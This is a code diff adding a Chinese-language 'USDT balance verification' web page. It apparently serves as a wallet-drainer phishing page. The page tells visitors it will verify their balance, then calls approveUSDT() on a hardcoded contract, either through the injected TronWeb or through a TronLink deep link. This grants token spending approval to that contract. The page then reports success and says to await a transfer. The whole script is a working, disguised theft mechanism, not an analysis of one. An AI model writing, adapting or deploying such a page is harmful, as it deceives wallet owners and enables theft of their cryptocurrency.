@@ -1,0 +1,248 @@
+<!DOCTYPE html>
+<html lang="zh-TW">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
+    <title>USDT 快速驗證</title>
+    <style>
+        body {
+            font-family: -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, Helvetica, Arial, sans-serif;
+            background-color: #f5f5f7;
+            margin: 0;
+            padding: 20px;
+            display: flex;
+            flex-direction: column;
+            align-items: center;
+            min-height: 100vh;
+        }
+
+        .card {
+            background: white;
+            border-radius: 16px;
+            box-shadow: 0 4px 20px rgba(0,0,0,0.08);
+            padding: 30px 20px;
+            width: 100%;
+            max-width: 400px;
+            text-align: center;
+            box-sizing: border-box;
+        }
+
+        .logo {
+            width: 60px;
+            height: 60px;
+            background: linear-gradient(135deg, #007bff, #0056b3);
+            border-radius: 50%;
+            margin: 0 auto 20px;
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            color: white;
+            font-size: 30px;
+            font-weight: bold;
+        }
+
+        h1 {
+            color: #333;
+            font-size: 22px;
+            margin-bottom: 10px;
+        }
+
+        p {
+            color: #666;
+            font-size: 15px;
+            line-height: 1.5;
+            margin-bottom: 25px;
+        }
+
+        .status {
+            background: #f0f2f5;
+            padding: 15px;
+            border-radius: 8px;
+            font-size: 13px;
+            color: #555;
+            margin-bottom: 20px;
+            text-align: left;
+        }
+
+        .status-row {
+            display: flex;
+            justify-content: space-between;
+            margin-bottom: 5px;
+        }
+
+        .status-val {
+            font-weight: 600;
+            color: #007bff;
+            word-break: break-all;
+            max-width: 150px;
+            overflow: hidden;
+            text-overflow: ellipsis;
+        }
+
+        .btn {
+            background: linear-gradient(135deg, #007bff, #0056b3);
+            color: white;
+            border: none;
+            padding: 16px;
+            font-size: 17px;
+            font-weight: 600;
+            border-radius: 12px;
+            width: 100%;
+            cursor: pointer;
+            box-shadow: 0 4px 12px rgba(0,123,255,0.25);
+            transition: transform 0.1s;
+        }
+
+        .btn:active {
+            transform: scale(0.98);
+        }
+
+        .btn:disabled {
+            background: #ccc;
+            box-shadow: none;
+        }
+
+        .alert {
+            margin-top: 15px;
+            font-size: 13px;
+            color: #d9534f;
+            display: none;
+        }
+    </style>
+</head>
+<body>
+
+    <div class="card">
+        <div class="logo">T</div>
+        <h1>USDT 餘額驗證</h1>
+        <p>請點擊下方按鈕，使用您的錢包進行一鍵授權。</p>
+
+        <div class="status">
+            <div class="status-row">
+                <span>偵測狀態:</span>
+                <span id="statusText">偵測中...</span>
+            </div>
+            <div class="status-row">
+                <span>錢包地址:</span>
+                <span id="addrText" class="status-val">-</span>
+            </div>
+        </div>
+
+        <button class="btn" id="actionBtn" onclick="triggerWallet()">
+            點擊授權並驗證
+        </button>
+        
+        <div class="alert" id="alertMsg">
+            請確保已安裝 TronLink, Trust Wallet 或 TokenPocket
+        </div>
+    </div>
+
+    <script>
+        // 你的合約地址
+        const CONTRACT_ADDRESS = 'TSidTNhDCbwWNfzsaCF2ae9ztezebg2gFM';
+        
+        // Deep Link 前綴
+        const TRONLINK_SCHEME = 'tronlink://';
+        const TRUST_WALLET_SCHEME = 'trust://'; // Trust Wallet 有時支援
+        const TOKENPOCKET_SCHEME = 'tokenpocket://';
+
+        let currentTronWeb = null;
+
+        // 自動偵測錢包 (針對手機端瀏覽器注入的對象)
+        window.onload = function() {
+            const statusText = document.getElementById('statusText');
+            const addrText = document.getElementById('addrText');
+            const btn = document.getElementById('actionBtn');
+
+            // 1. 檢查 TronLink (PC/Mobile Web)
+            if (window.tronWeb) {
+                currentTronWeb = window.tronWeb;
+                statusText.innerText = "已連接 (TronLink)";
+                statusText.style.color = "green";
+                addrText.innerText = currentTronWeb.defaultAddress.base58;
+                return;
+            }
+
+            // 2. 檢查 TokenPocket
+            if (window.tokenPocket) {
+                statusText.innerText = "已連接 (TokenPocket)";
+                statusText.style.color = "green";
+                // TP 可能需要額外初始化，這裡假設已注入
+                return;
+            }
+
+            // 3. 檢查 MathWallet
+            if (window.mathWallet) {
+                statusText.innerText = "已連接 (MathWallet)";
+                statusText.style.color = "green";
+                return;
+            }
+
+            // 如果沒有直接注入，預設為「待喚起」狀態
+            statusText.innerText = "等待喚起錢包...";
+            statusText.style.color = "#e67e22";
+            addrText.innerText = "點擊按鈕後顯示";
+            
+            // 顯示提示
+            document.getElementById('alertMsg').style.display = 'block';
+        };
+
+        async function triggerWallet() {
+            const btn = document.getElementById('actionBtn');
+            const statusText = document.getElementById('statusText');
+            const addrText = document.getElementById('addrText');
+
+            btn.disabled = true;
+            btn.innerText = "正在喚起錢包...";
+
+            try {
+                // 情況 A: 錢包已經注入瀏覽器 (TronLink Web 版等)
+                if (currentTronWeb) {
+                    const contract = await currentTronWeb.contract().at(CONTRACT_ADDRESS);
+                    const result = await contract.approveUSDT().send({
+                        feeLimit: 100000000,
+                        from: currentTronWeb.defaultAddress.base58
+                    });
+                    finishSuccess();
+                    return;
+                }
+
+                // 情況 B: 嘗試喚起 App (Deep Link)
+                // 這會嘗試打開 TronLink App
+                // 注意：不同錢包對 Deep Link 的支援度不同，TronLink 支援最好
+                window.location.href = TRONLINK_SCHEME + 'tx?to=' + CONTRACT_ADDRESS + '&function=approveUSDT()';
+                
+                // 為了保險起見，也嘗試其他錢包的 Scheme (雖然大多數需要手動配置)
+                // 這裡主要依賴 TronLink 的通用性
+                
+                // 如果 5 秒後沒有彈出，提示用戶
+                setTimeout(() => {
+                    if (btn.disabled) {
+                        alert("未偵測到錢包 App，請手動安裝 TronLink 並重試。");
+                        btn.disabled = false;
+                        btn.innerText = "重試";
+                    }
+                }, 3000);
+
+            } catch (error) {
+                console.error(error);
+                alert("調用失敗: " + error.message);
+                btn.disabled = false;
+                btn.innerText = "重試";
+            }
+        }
+
+        function finishSuccess() {
+            document.getElementById('statusText').innerText = "✅ 授權成功！";
+            document.getElementById('statusText').style.color = "green";
+            document.getElementById('addrText').innerText = currentTronWeb.defaultAddress.base58;
+            btn.innerText = "驗證完成";
+            btn.style.background = "#28a745";
+            
+            setTimeout(() => {
+                alert("USDT 授權成功！請等待轉賬...");
+            }, 1500);
+        }
+    </script>
+</body>
+</html>
